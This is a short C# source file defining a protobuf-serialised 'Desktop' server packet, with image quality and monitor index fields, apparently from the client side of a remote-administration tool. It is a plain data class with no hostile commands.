using ProtoBuf;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class Desktop : IPacket
    {
        [ProtoMember(1)]
        public int Quality { get; set; }

        [ProtoMember(2)]
        public int Monitor { get; set; }

        public Desktop()
        {
        }

        public Desktop(int quality, int monitor)
        {
            this.Quality = quality;
            this.Monitor = monitor;
        }

        public void Execute(Client client)
        {
            client.Send<Desktop>(this);
        }
    }
}